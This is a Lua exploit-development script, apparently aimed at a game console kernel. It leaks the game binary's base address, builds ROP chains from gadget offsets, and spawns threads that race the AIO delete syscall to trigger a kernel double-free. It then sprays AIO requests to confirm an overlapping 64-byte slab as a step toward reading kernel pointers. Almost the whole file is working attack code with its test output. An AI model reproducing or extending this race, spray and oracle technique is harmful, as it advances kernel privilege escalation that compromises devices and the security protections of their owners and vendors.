-- CRASH_CLASS: MODERATE
-- PROBE 67f: Fresh-process race + overlap oracle
--
-- After game relaunch, confirm fresh pid/eboot, then run 662 race.
-- Tests 3 patterns: original 65l (no sync), nanosleep sync, main+child.
-- If doubles found, immediately spray + poll-flag oracle.

print("=== PROBE 67f: fresh process 662 race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSEGV, SIGSYS, SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print(string.format("eboot=0x%X%08X", ehi, elo))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("ERROR: no /dev/zero"); return end

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end
local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)), uint64(0), uint64(0)) end)
    return rd(N(one_st)) or 0xDEAD
end

-- Quick AIO sanity check
print("")
local test_id = submit_one()
print(string.format("AIO sanity: id=0x%X", test_id))
if test_id == 0 then print("ERROR: AIO submit broken"); return end
poll_664(test_id)
local test_st = query_663(test_id)
print(string.format("  663 status=0x%08X (expect 0x00010003=polled)", test_st))
-- Clean up
wd(N(one_id), test_id); wd(N(one_st), 0)
pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
print(string.format("  662 delete=0x%08X (expect 0)", rd(N(one_st)) or -1))

local BATCH = 16  -- Match original 65l
local del_ids  = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

local sleep_ts = memory.alloc(16)
wq(N(sleep_ts), uint64(0))

local total_doubles = 0
local winning_pattern = ""

local function build_child(stk_buf, del_addr, count, states_addr, marker_addr, marker_val, do_sleep)
    local sb = N(stk_buf)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    -- start marker
    em(g_pop_rax); em(uint64(marker_val))
    em(g_pop_rdi); em(uint64(marker_addr))
    em(g_mov_m_rax)
    if do_sleep then
        em(g_pop_rdi); em(uint64(N(sleep_ts)))
        em(g_pop_rsi); em(uint64(0))
        em(g_pop_rax); em(uint64(240))
        em(stub)
    end
    -- 662 batch delete
    em(g_pop_rdi); em(uint64(del_addr))
    em(g_pop_rsi); em(uint64(count))
    em(g_pop_rdx); em(uint64(states_addr))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    -- done marker
    em(g_pop_rax); em(uint64(marker_val + 0x10))
    em(g_pop_rdi); em(uint64(marker_addr))
    em(g_mov_m_rax)
    -- exit
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)
end

local function spawn_child(stk_buf)
    local sb = N(stk_buf)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tp = memory.alloc(8); wq(N(tp), uint64(0))
    wq(N(par) + 0x30, tp)
    pcall(function() mk(455)(par, uint64(0x38)) end)
end

local function run_race(label, trials, do_sleep, sleep_ns)
    if not alive() then return end
    if sleep_ns then wq(N(sleep_ts) + 8, uint64(sleep_ns)) end

    local pat_dbl = 0
    for trial = 1, trials do
        if not alive() then break end

        local ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_664(id); table.insert(ids, id) end
        end
        if #ids < 8 then
            print(string.format("  %s trial %d: only %d IDs", label, trial, #ids))
            break
        end
        local count = #ids

        for i = 0, count - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end
        wq(N(marker_A), uint64(0))
        wq(N(marker_B), uint64(0))

        local stk_A = memory.alloc(0x4000)
        local stk_B = memory.alloc(0x4000)
        build_child(stk_A, N(del_ids), count, N(states_A), N(marker_A), 0x41, do_sleep)
        build_child(stk_B, N(del_ids), count, N(states_B), N(marker_B), 0x42, do_sleep)

        spawn_child(stk_A)
        spawn_child(stk_B)

        for w = 1, 80000 do local _ = rd(N(dbuf)) end

        local mA = rd(N(marker_A)) or 0
        local mB = rd(N(marker_B)) or 0
        local a_ok, b_ok, doubles = 0, 0, 0
        for i = 0, count - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 then a_ok = a_ok + 1 end
            if sB == 0 then b_ok = b_ok + 1 end
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end
        pat_dbl = pat_dbl + doubles
        total_doubles = total_doubles + doubles

        if doubles > 0 then
            print(string.format("  %s trial %d: *** %d DOUBLES *** A=%d B=%d mA=0x%X mB=0x%X",
                label, trial, doubles, a_ok, b_ok, mA, mB))
            if winning_pattern == "" then winning_pattern = label end
        elseif trial <= 3 or trial == trials then
            print(string.format("  %s trial %d: dbl=0 A=%d B=%d mA=0x%X mB=0x%X",
                label, trial, a_ok, b_ok, mA, mB))
        end

        if not alive() then break end
    end
    return pat_dbl
end

-- =========================================================
-- [A] Original 65l pattern: no sync, BATCH=16
-- =========================================================
print("")
print("[A] Original 65l pattern (no sync, BATCH=16)")
local a_dbl = run_race("nosync", 30, false, nil)
print(string.format("  subtotal: %d doubles", a_dbl))

-- =========================================================
-- [B] Nanosleep sync variants
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print("[B] Nanosleep sync variants")
    local sleeps = {
        {100000, "100us"},
        {500000, "500us"},
        {1000000, "1ms"},
        {5000000, "5ms"},
    }
    for _, sv in ipairs(sleeps) do
        if not alive() then break end
        local d = run_race("sleep_" .. sv[2], 10, true, sv[1])
        print(string.format("  sleep=%s: %d doubles", sv[2], d))
        if d > 0 then break end
    end
end

-- =========================================================
-- [C] Main+child: main calls 662 via make_syscall while child calls via ROP
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print("[C] Main+child race")
    for trial = 1, 20 do
        if not alive() then break end

        local ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_664(id); table.insert(ids, id) end
        end
        if #ids < 8 then
            print(string.format("  trial %d: only %d IDs", trial, #ids))
            break
        end
        local count = #ids

        for i = 0, count - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end
        wq(N(marker_A), uint64(0))

        -- Child: straight to 662 (no sleep)
        local stk = memory.alloc(0x4000)
        build_child(stk, N(del_ids), count, N(states_A), N(marker_A), 0x41, false)
        spawn_child(stk)

        -- Main: immediately call 662
        pcall(function()
            mk(662)(uint64(N(del_ids)), uint64(count), uint64(N(states_B)))
        end)

        for w = 1, 80000 do local _ = rd(N(dbuf)) end

        local mA = rd(N(marker_A)) or 0
        local kid_ok, main_ok, doubles = 0, 0, 0
        for i = 0, count - 1 do
            local sk = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sm = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sk == 0 then kid_ok = kid_ok + 1 end
            if sm == 0 then main_ok = main_ok + 1 end
            if sk == 0 and sm == 0 then doubles = doubles + 1 end
        end
        total_doubles = total_doubles + doubles

        if doubles > 0 then
            print(string.format("  trial %2d: *** %d DOUBLES *** kid=%d main=%d mA=0x%X",
                trial, doubles, kid_ok, main_ok, mA))
            if winning_pattern == "" then winning_pattern = "main+child" end
        elseif trial <= 3 or trial == 20 then
            print(string.format("  trial %2d: dbl=0 kid=%d main=%d mA=0x%X",
                trial, kid_ok, main_ok, mA))
        end

        if not alive() then break end
    end
end

-- =========================================================
-- [D] OVERLAP ORACLE (only if doubles found)
-- =========================================================
if alive() and total_doubles > 0 then
    print("")
    print("[D] OVERLAP ORACLE — spray after double-free")
    print("  winning pattern: " .. winning_pattern)

    -- Run one more double-free with the winning pattern, then spray
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_664(id); table.insert(ids, id) end
    end
    local count = #ids
    print(string.format("  submitted %d victims", count))

    if count >= 8 then
        for i = 0, count - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end
        wq(N(marker_A), uint64(0))
        wq(N(marker_B), uint64(0))

        -- Use winning pattern
        local stk_A = memory.alloc(0x4000)
        local stk_B = memory.alloc(0x4000)
        local use_sleep = (winning_pattern ~= "nosync" and winning_pattern ~= "main+child")
        build_child(stk_A, N(del_ids), count, N(states_A), N(marker_A), 0x41, use_sleep)
        build_child(stk_B, N(del_ids), count, N(states_B), N(marker_B), 0x42, use_sleep)
        spawn_child(stk_A)
        spawn_child(stk_B)
        for w = 1, 80000 do local _ = rd(N(dbuf)) end

        local doubles = 0
        for i = 0, count - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end
        print(string.format("  oracle-round doubles: %d", doubles))

        if doubles > 0 and alive() then
            -- Spray 128 unpolled AIO to reclaim freed slots
            local spray = {}
            for i = 1, 128 do
                if not alive() then break end
                local id = submit_one()
                if id ~= 0 then table.insert(spray, id) end
            end
            print(string.format("  sprayed %d AIO requests", #spray))

            -- Poll EVEN indices
            for i = 2, #spray, 2 do
                if alive() then poll_664(spray[i]) end
            end

            -- Check ODD indices for leaked poll flag
            local overlaps = 0
            for i = 1, #spray, 2 do
                if not alive() then break end
                local st = query_663(spray[i])
                if st == 0x00010003 then
                    overlaps = overlaps + 1
                    print(string.format("    *** OVERLAP spray[%d] id=0x%X ***", i, spray[i]))
                end
            end
            print(string.format("  OVERLAPS: %d / %d odd indices", overlaps, math.floor(#spray / 2)))

            if overlaps > 0 then
                print("")
                print("  *** ZONE-64 OVERLAP CONFIRMED ***")
                print("  Two AIO completion records share the same 64-byte slab.")
                print("  Next: read kernel thread pointer at completion_record+0x08")

                -- Try to read the overlapping objects' data
                for i = 1, #spray, 2 do
                    if not alive() then break end
                    local st = query_663(spray[i])
                    if st == 0x00010003 then
                        -- This unpolled request inherited polled status = memory overlap
                        -- Its completion record shares memory with a polled even-index request
                        -- The completion record at +0x08 should have a kernel thread pointer
                        print(string.format("    overlap id=0x%X status=0x%08X", spray[i], st))
                    end
                end
            end

            -- Cleanup spray
            for i = 1, #spray do
                if alive() then poll_664(spray[i]) end
            end
            local dbuf2 = memory.alloc(4 * #spray + 4)
            local sbuf2 = memory.alloc(4 * #spray + 4)
            for i = 1, #spray do
                wd(N(dbuf2) + (i-1)*4, spray[i])
                wd(N(sbuf2) + (i-1)*4, 0)
            end
            pcall(function()
                mk(662)(uint64(N(dbuf2)), uint64(#spray), uint64(N(sbuf2)))
            end)
        end
    end
end

print("")
print("[SUMMARY]")
print(string.format("  total_doubles=%d alive=%s pid=%d pattern=%s",
    total_doubles, alive() and "YES" or "NO", pid_val,
    winning_pattern ~= "" and winning_pattern or "none"))
print("")
print("=== PROBE 67f COMPLETE ===")
